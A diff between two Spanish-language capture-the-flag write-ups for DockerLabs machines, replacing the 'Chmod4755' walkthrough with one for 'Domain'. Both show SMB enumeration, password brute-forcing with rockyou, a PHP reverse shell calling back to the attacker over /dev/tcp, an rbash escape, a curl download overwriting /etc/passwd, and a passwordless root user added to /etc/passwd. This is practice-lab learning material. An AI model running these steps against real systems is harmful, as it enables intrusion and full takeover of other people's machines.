@@ -1,12 +1,12 @@
 #MAQUINA #DOCKERLABS #MEDIO 
 #ENUM4LINUX #CRACKMAPEXEC #SMBMAP 
-#SMBCLIENT 
+#SMBCLIENT #ABUSO_SUBIDA_ARCHIVOS 
 
 <hr>
 
 # RECONOCIMIENTO
 
-Vamos a resolver **Chmod4755** de la plataforma **DockerLabs**.
+Vamos a resolver **Domain** de la plataforma **DockerLabs**.
 
    ```bash
 
@@ -20,28 +20,28 @@ Primero vamos a hacer un escaneo de puertos rápido:
 
 nmap -sS -vvv -p- --min-rate 5000 -n -Pn 172.17.0.2
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-17 12:38 CET
-Initiating ARP Ping Scan at 12:38
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-17 15:06 CET
+Initiating ARP Ping Scan at 15:06
 Scanning 172.17.0.2 [1 port]
-Completed ARP Ping Scan at 12:38, 0.05s elapsed (1 total hosts)
-Initiating SYN Stealth Scan at 12:38
+Completed ARP Ping Scan at 15:06, 0.06s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 15:06
 Scanning 172.17.0.2 [65535 ports]
+Discovered open port 80/tcp on 172.17.0.2
 Discovered open port 445/tcp on 172.17.0.2
-Discovered open port 22/tcp on 172.17.0.2
 Discovered open port 139/tcp on 172.17.0.2
-Completed SYN Stealth Scan at 12:38, 0.49s elapsed (65535 total ports)
+Completed SYN Stealth Scan at 15:06, 0.49s elapsed (65535 total ports)
 Nmap scan report for 172.17.0.2
 Host is up, received arp-response (0.0000030s latency).
-Scanned at 2025-03-17 12:38:04 CET for 0s
+Scanned at 2025-03-17 15:06:13 CET for 0s
 Not shown: 65532 closed tcp ports (reset)
 PORT    STATE SERVICE      REASON
-22/tcp  open  ssh          syn-ack ttl 64
+80/tcp  open  http         syn-ack ttl 64
 139/tcp open  netbios-ssn  syn-ack ttl 64
 445/tcp open  microsoft-ds syn-ack ttl 64
 MAC Address: 02:42:AC:11:00:02 (Unknown)
 
 Read data files from: /usr/share/nmap
-Nmap done: 1 IP address (1 host up) scanned in 0.72 seconds
+Nmap done: 1 IP address (1 host up) scanned in 0.69 seconds
            Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
 
 
@@ -56,70 +56,86 @@ Nmap done: 1 IP address (1 host up) scanned in 0.72 seconds
 - **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
 - **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.
 
-**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto  el puerto **22(SSH)** , **139 y 445** abiertos.
+**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** y los puertos **139** y **445** abiertos.
 
 Ahora vamos a hacer un escaneo con mayor detalle:
 
    ```bash
 
-nmap -sCV -p22,139,445 172.17.0.2              
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-17 12:38 CET
+nmap -sCV -p80,139,445 172.17.0.2                
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-17 15:06 CET
 Nmap scan report for 172.17.0.2
-Host is up (0.000017s latency).
+Host is up (0.000015s latency).
 
 PORT    STATE SERVICE     VERSION
-22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   256 a8:62:07:af:8e:77:13:6d:25:0a:2f:43:63:de:38:38 (ECDSA)
-|_  256 93:93:a8:35:0e:fa:3e:05:04:27:70:2e:fc:22:e8:99 (ED25519)
+80/tcp  open  http        Apache httpd 2.4.52 ((Ubuntu))
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: \xC2\xBFQu\xC3\xA9 es Samba?
 139/tcp open  netbios-ssn Samba smbd 4.6.2
 445/tcp open  netbios-ssn Samba smbd 4.6.2
 MAC Address: 02:42:AC:11:00:02 (Unknown)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Host script results:
-| smb2-time: 
-|   date: 2025-03-17T11:39:03
-|_  start_date: N/A
 | smb2-security-mode: 
 |   3:1:1: 
 |_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2025-03-17T14:07:08
+|_  start_date: N/A
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 16.44 seconds
+Nmap done: 1 IP address (1 host up) scanned in 16.65 seconds
+
+
 
 
 ```
 
    ```bash
 
+nmap --script="http-enum" 172.17.0.2
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-17 15:07 CET
+Nmap scan report for 172.17.0.2
+Host is up (0.0000030s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT    STATE SERVICE
+80/tcp  open  http
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds
+
+
 enum4linux 172.17.0.2
+
  ========================================( Users on 172.17.0.2 )========================================
                                                                                                                                                                                           
-index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: smbuser  Name: smbuser   Desc:                                                                                                             
+index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: james    Name: james     Desc:                                                                                                             
+index: 0x2 RID: 0x3e9 acb: 0x00000010 Account: bob      Name: bob       Desc: 
 
-user:[smbuser] rid:[0x3e8]
-
-
-
+user:[james] rid:[0x3e8]
+user:[bob] rid:[0x3e9]
 
 ```
 
 - **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
 - **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
+- **`--script`**:  Ejecutar un script específico.
 
 ## SMB (445)
 
-Con enum4linux sacamos un usuario -> **smbuser**. Vamos a ver su contra :
+Con enum4linux sacamos dos usuarios -> **bob** y **james** . Vamos a ver su contra :
 ```bash
-crackmapexec smb 172.17.0.2 -u smbuser -p /usr/share/wordlists/rockyou.txt
-SMB         172.17.0.2      445    4B7BFD5AC784     [+] 4B7BFD5AC784\smbuser:fuckit
+crackmapexec smb 172.17.0.2 -u bob -p /usr/share/wordlists/rockyou.txt
+SMB         172.17.0.2      445    F57CDA103E88     [+] F57CDA103E88\bob:star 
+
 ```
 
 Vamos a ver que podemos ver gracias a **smbmap**:
 
 ```bash
-smbmap -H 172.17.0.2 -u smbuser -p fuckit                         
+ smbmap -H 172.17.0.2 -u bob -p star                
 
     ________  ___      ___  _______   ___      ___       __         _______
    /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
@@ -134,65 +150,59 @@ SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
 
 [*] Detected 1 hosts serving SMB                                                                                                  
 [*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
-                                                                                                                             
+                                                                                                    
 [+] IP: 172.17.0.2:445  Name: 172.17.0.2                Status: Authenticated
         Disk                                                    Permissions     Comment
         ----                                                    -----------     -------
         print$                                                  READ ONLY       Printer Drivers
-        share_secret_only                                       READ ONLY
-        IPC$                                                    NO ACCESS       IPC Service (4b7bfd5ac784 server (Samba, Ubuntu))
+        html                                                    READ, WRITE     HTML Share
+        IPC$                                                    NO ACCESS       IPC Service (f57cda103e88 server (Samba, Ubuntu))
 [*] Closed 1 connections
 ```
+
 # EXPLOTACION
 
-Usamos **smbclient** para conectarnos :
+Usamos **smbclient** para conectarnos a html:
 ```bash
-smbclient //172.17.0.2/share_secret_only -U smbuser
-Password for [WORKGROUP\smbuser]:
+smbclient //172.17.0.2/html -U bob                 
+Password for [WORKGROUP\bob]:
 Try "help" to get a list of possible commands.
 smb: \> dir
-  .                                   D        0  Mon Sep  2 14:05:05 2024
-  ..                                  D        0  Mon Sep  2 14:05:05 2024
-  note.txt                            N       13  Mon Sep  2 14:05:05 2024
+  .                                   D        0  Mon Mar 17 15:21:03 2025
+  ..                                  D        0  Thu Apr 11 10:18:47 2024
+  index.html                          N     1832  Thu Apr 11 10:21:43 2024
 
-                229727556 blocks of size 1024. 190597460 blocks available
-smb: \> get note.txt 
-getting file \note.txt of size 13 as note.txt (130000.0 KiloBytes/sec) (average inf KiloBytes/sec)
+                229727556 blocks of size 1024. 190412032 blocks available
 ```
 
-Tenemos una nota.
+Si nos damos cuenta esto es la web y tenemos permisos de escritura.
+Vamos a subir una reverse shell:
 
 ```bash
-cat note.txt                 
+<?php
 
-read better
+/**
+* Plugin Name: test-plugin
+* Plugin URI: https://www.your-site.com/
+* Description: Test.
+* Version: 0.1
+* Author: your-name
+* Author URI: https://www.your-site.com/
+**/
 
+
+	exec("/bin/bash -c 'bash -i > /dev/tcp/172.17.0.1/443 0>&1'");
+
+?>
 ```
 
-Tras un rato, me fijo en que había un segundo usuario -> **rabol** que me devolvía el enum4linux.
-
-Su contra es el nombre del directorio.
-
-YA ESTAMOS COMO RABOL.
+YA ESTAMOS COMO WWW-DATA.
 
 # ESCALADA PRIVILEGIOS
 
-Nos encontramos ante una rbash, donde solo podemos usar python y ls.
-
-Nos otorgamos una bash normal (sin restricciones):
-```bash
-python3 -c 'import os; os.system("/bin/bash")'
-
-```
-
-Seguimos sin poder ejecutar los archivos bien :
-```bash
-export PATH=/bin
-```
-
-Vemos archivos con permisos SUID :
-```bash
-rabol@4b7bfd5ac784:/$ find / -perm -4000 2>/dev/null
+Vemos si hay archivos que tienen permisos SUID:
+   ```bash
+www-data@f57cda103e88:/$ find / -perm -4000 2>/dev/null
 /usr/bin/su
 /usr/bin/passwd
 /usr/bin/chfn
@@ -201,15 +211,16 @@ rabol@4b7bfd5ac784:/$ find / -perm -4000 2>/dev/null
 /usr/bin/mount
 /usr/bin/gpasswd
 /usr/bin/chsh
-/usr/bin/sudo
-/usr/bin/curl
-/usr/lib/openssh/ssh-keysign
+/usr/bin/nano
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+
+
 ```
 
-Modificamos el passwd, añadiendo un nuevo usuario con el directorio personal de root y sin necesidad de usar contra :
+Vemos **nano** con permisos SUID, modificamos el `/etc/passwd` :
 
-```bash
+   ```bash
+www-data@f57cda103e88:/$ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -226,28 +237,18 @@ www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
 backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
 list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
 irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
-_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
 nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-rabol:x:1001:1001:rabol,,,:/home/rabol:/bin/rbash
-systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
-systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
-messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
-systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
-sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
-smbuser:x:1000:1000:smbuser,,,:/home/smbuser:/bin/bash
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
+bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
+james:x:1001:1001:james,,,:/home/james:/bin/bash
 newroot::0:0:newroot:/root:/bin/bash
-```
 
-Usamos curl :
-```bash
-rabol@4b7bfd5ac784:/tmp$ curl http://172.17.0.1:8000/newShadow -o /etc/passwd
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-100  1292  100  1292    0     0  1711k      0 --:--:-- --:--:-- --:--:-- 1261k
-rabol@4b7bfd5ac784:/tmp$ su newroot
-root@4b7bfd5ac784:/tmp# whoami
+www-data@f57cda103e88:/$ su newroot
+root@f57cda103e88:/# whoami
 root
-root@4b7bfd5ac784:/tmp# 
+root@f57cda103e88:/# 
 ```
 
 **YA ESTAMOS COMO ROOT.**
